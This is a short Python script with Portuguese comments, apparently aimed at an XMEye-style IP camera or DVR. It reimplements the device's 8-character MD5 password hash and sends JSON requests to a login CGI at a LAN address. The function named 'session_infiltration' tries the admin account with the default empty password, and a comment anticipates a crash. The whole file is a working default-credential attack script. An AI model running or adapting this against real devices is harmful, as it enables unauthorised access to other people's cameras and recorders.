import requests
import json
import hashlib

def md5_8(password):
    m = hashlib.md5()
    m.update(password.encode('utf-8'))
    hex_digest = m.hexdigest()
    bytes_arr = [int(hex_digest[i:i+2], 16) for i in range(0, 32, 2)]
    output = []
    for i in range(8):
        val = (bytes_arr[2*i] + bytes_arr[2*i+1]) % 62
        if 0 <= val <= 9: output.append(chr(val + 48))
        elif 10 <= val <= 35: output.append(chr(val + 55))
        else: output.append(chr(val + 61))
    return "".join(output)

def session_infiltration():
    url = "http://192.168.3.71/cgi-bin/login.cgi"
    session = requests.Session() # Mantém a conexão aberta
    
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    }

    # Passo 1: GetPreLoginInfo
    print("📡 Passo 1: Solicitando Pre-Login...")
    try:
        res1 = session.post(url, data=json.dumps({"Name": "GetPreLoginInfo"}), headers=headers, timeout=10)
        print(f"✅ Resposta 1: {res1.text}")
    except Exception as e:
        print(f"❌ Erro no Passo 1: {e}")
        return

    # Passo 2: OPLogin com MD5_8 do vazio (Admin padrão)
    print("\n📡 Passo 2: Tentando Login com Admin (MD5_8)...")
    password_hashed = md5_8("") # 'tlJwpbo6'
    login_payload = {
        "Name": "OPLogin",
        "OPLogin": {
            "UserName": "admin",
            "Password": password_hashed,
            "LoginType": "Address"
        }
    }
    try:
        res2 = session.post(url, data=json.dumps(login_payload), headers=headers, timeout=10)
        print(f"✅ Resposta 2: {res2.text}")
        if "Ret\":100" in res2.text:
            print("💎 LOGIN REALIZADO COM SUCESSO!")
    except Exception as e:
        print(f"❌ Erro no Passo 2 (Pode ser o crash esperado): {e}")

if __name__ == "__main__":
    session_infiltration()
